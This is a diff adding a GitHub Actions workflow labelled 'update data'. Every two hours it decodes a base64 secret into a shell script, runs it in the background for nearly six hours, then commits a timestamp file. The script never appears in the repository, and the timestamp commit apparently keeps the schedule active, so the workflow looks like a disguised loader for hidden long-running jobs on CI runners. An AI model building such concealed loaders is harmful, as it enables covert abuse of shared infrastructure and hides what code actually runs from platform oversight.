@@ -1,0 +1,45 @@
+name: update data
+
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+  push:
+    branches: [main]
+
+permissions:
+  contents: write
+
+jobs:
+  build:
+    name: Build
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup node
+        uses: actions/setup-node@v4
+        with:
+          node-version: '22'
+      - name: Jalankan Skrip
+        env:
+          TEZ: ${{ secrets.TEZ }}
+        run: |
+          echo "$TEZ" | base64 --decode > ku.sh
+          sh ku.sh > ku.log 2>&1 &
+          for i in $(seq 1 700); do
+            sleep 30
+            tail -1 ku.log
+          done
+          echo "OK!"
+          git fetch origin
+          git reset --hard origin/main
+          
+          date "+%Y-%m-%d %H:%M:%S" > last_update.txt
+          
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          
+          git add last_update.txt
+          git diff --cached --quiet || git commit -m "update data [skip ci]"
+          
+          git push origin main
